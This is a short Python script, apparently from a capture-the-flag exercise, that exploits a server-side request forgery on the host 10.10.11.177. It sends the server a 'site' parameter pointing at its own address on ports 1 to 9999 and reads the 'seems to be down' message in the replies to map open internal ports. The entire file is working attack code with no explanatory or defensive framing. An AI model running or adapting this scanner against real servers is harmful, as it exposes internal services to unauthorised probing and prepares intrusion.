import requests
import sys
from multiprocessing import Pool, cpu_count
from tqdm import tqdm

START_RANGE=1
END_RANGE=10000

def fuzz(port):
    data = {"site": f"http://10.10.11.177:{port}", "debug":"1"}
    r = requests.post("http://10.10.11.177/", data=data)
    if "seems to be down" not in r.text:
        tqdm.write(f"Open port: {port}, URL: http://10.10.11.177:{port}")

if __name__ == "__main__":
    tqdm.write(f"Scanning range: {START_RANGE} - {END_RANGE}")
    with Pool(processes=10) as pool:
        for _ in tqdm(pool.imap_unordered(fuzz, range(START_RANGE, END_RANGE)), total=END_RANGE-START_RANGE):
            pass